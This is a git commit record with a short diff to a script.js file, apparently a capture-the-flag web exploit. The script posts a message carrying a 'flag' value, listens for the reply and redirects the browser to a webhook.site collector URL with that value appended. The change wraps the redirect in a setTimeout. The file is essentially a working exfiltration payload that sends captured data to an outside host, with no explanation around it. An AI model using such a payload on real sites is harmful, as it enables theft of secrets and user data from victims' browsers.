bbea7ac0e74dbf3464aa20574d3a6b73ecf93ddc
MinNguRoi <lengocbaominh161@gmail.com>
2025-08-31 15:48:11 +0700

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,5 @@
 window.postMessage({type: "create", payload: flag});
 window.addEventListener('message', (event) => {
-	document.location.href="https://webhook.site/2f16d9d2-d7dc-41ed-b791-41ba3e4de387?flag${event.data.payload}"
+setTimeout(function(){document.location.href = "https://webhook.site/2f16d9d2-d7dc-41ed-b791-41ba3e4de387?flag=${event.data.payload}";},100);
     });
 console.log('k');
